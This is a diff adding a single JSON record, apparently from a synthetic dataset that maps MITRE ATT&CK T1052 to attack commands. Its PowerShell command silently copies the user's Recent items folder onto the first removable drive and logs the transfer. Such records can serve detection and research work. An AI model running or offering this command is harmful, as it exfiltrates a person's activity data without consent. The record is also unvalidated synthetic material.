@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\media\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; robocopy \"$env:APPDATA\\Microsoft\\Windows\\Recent\" $dest /E /R:1 /W:1 /NFL /NDL /NP /NJH /NJS > \"$dest\\rc.log\"; Write-Output \"Robocopy complete to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Uses the built-in robocopy tool to mirror the Recent items directory onto a removable drive, maintaining local-only data transfer and logging.",
+  "rationale_steps": [
+    "Determine removable media path",
+    "Create destination directory on USB",
+    "Use robocopy to efficiently copy local files to USB",
+    "Write a local log entry via Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-e0516f06",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
